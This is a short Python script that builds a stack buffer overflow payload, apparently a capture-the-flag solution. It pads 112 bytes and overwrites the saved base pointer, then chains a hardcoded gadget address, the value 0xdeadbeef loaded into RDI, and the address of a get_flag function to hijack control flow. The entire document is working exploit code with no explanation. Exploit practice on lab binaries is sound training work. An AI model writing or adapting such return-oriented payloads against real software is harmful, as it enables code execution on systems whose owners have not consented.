from struct import *

payload = b'A'*112
payload += b'B'*8 # Saved RBP

gadget_addr = 0x00400693 # Gadget address
rdi_canary = 0xdeadbeef # RDI value to pass check
get_flag_addr = 0x004005ea # get_flag address

gadget_addr = pack("<Q", gadget_addr)
rdi_canary = pack("<Q", rdi_canary)
get_flag_addr = pack("<Q", get_flag_addr)

print(payload + gadget_addr + rdi_canary + get_flag_addr)